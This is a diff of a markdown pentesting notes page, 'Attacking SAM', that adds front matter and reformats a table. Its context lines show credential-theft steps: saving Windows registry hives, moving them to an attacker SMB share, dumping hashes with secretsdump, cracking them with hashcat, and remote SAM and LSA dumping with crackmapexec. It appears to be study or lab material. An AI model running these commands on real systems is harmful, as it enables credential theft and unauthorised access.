@@ -1,6 +1,11 @@
-
-
-
+---
+title: Attacking SAM
+author: amandaguglieri
+draft: false
+TableOfContents: true
+tags:
+  - windows
+---
 # Attacking SAM
 
 [See Windows credentials storage](windows-credentials-storage.md).
@@ -11,12 +16,11 @@
 
 There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. 
 
-|Registry Hive|Description|
-|---|---|
-|`hklm\sam`|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
-|`hklm\system`|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
-|`hklm\security`|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|
-
+| Registry Hive   | Description                                                                                                                                                |
+| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
+| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
+| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |
 
 Launching CMD as an admin will allow us to run reg.exe to save copies of the registry hives.
 
@@ -41,7 +45,6 @@ move sam.save \\$ipAttacker\CompData
 move system.save \\$ipAttacker\CompData
 move security.save \\$ipAttacker\CompData
 ```
-
 
 ### 2. Dumping Hashes with Impacket's secretsdump.py
 
@@ -82,7 +85,7 @@ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 
 ## Dumping SAM Remotely
 
-### With CrackMapExec
+#### With CrackMapExec
 
 With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. 
 
@@ -92,5 +95,4 @@ With access to credentials with local admin privileges, it is also possible for 
 crackmapexec smb $ip --local-auth -u <username> -p <password> --sam
 
 crackmapexec smb $ip --local-auth -u <username> -p <password> --lsa
-
 ```
